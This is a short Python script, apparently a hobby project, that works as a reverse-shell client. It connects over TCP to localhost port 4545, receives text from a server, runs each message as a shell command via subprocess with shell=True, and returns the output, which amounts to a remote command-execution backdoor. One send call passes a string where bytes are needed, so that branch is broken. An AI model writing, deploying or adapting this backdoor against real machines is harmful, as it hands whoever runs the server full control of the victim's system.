import socket
import subprocess

FORMAT = "utf-8"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP

client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # for testing only

client.connect(("localhost", 4545)) # connect to server

# make the connect a while loop until confirm code was send
client.send('#Connect'.encode(FORMAT)) # send connect message

while True:
    reply = client.recv(1024).decode(FORMAT)
    print(reply)

    run = subprocess.run(reply, shell=True, capture_output=True).stdout

    if run:
        print(run)

        client.send(run)
        continue
    client.send("#Empty_run")
